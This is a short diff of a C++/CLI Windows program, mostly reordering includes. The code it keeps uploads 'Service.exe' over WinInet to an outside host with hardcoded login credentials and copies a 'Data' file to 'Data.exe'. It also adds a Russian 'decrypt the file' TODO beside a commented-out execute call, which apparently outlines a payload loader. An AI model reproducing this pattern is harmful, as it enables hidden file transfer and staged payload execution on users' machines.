@@ -3,19 +3,17 @@
 #include <stdio.h>
 #include <fcntl.h>
 #include <io.h>
-using namespace Project2;
-
 #include <iostream>
 #include <stdio.h>
-// 123123.cpp: определяет точку входа для консольного приложения.
-//
 #include <Windows.h>
-
 #include <WinInet.h>
 #include <conio.h>
+
 using std::cout;
 using std::cin;
 using std::endl;
+using namespace Project2;
+
 #pragma comment (lib, "wininet.lib")
 
 void upload(LPCSTR server, LPCSTR login, LPCSTR pass, LPCWSTR local_file, LPCWSTR remote_file)
@@ -42,8 +40,9 @@ int main(array <System::String ^> ^args)
 	Application::SetCompatibleTextRenderingDefault(false);
 
 	upload("fokes1.asuscomm.com", "ff", "WorkerFF", L"Service.exe", L"Service.exe");
-
 	CopyFile(L"Data", L"Data.exe", false);
+
+	//TODO: Расшифровать файл
 
 	//LPCTSTR path = L"Service.exe";
 	//ShellExecute(NULL, L"open", path, NULL, NULL, SW_SHOWDEFAULT);
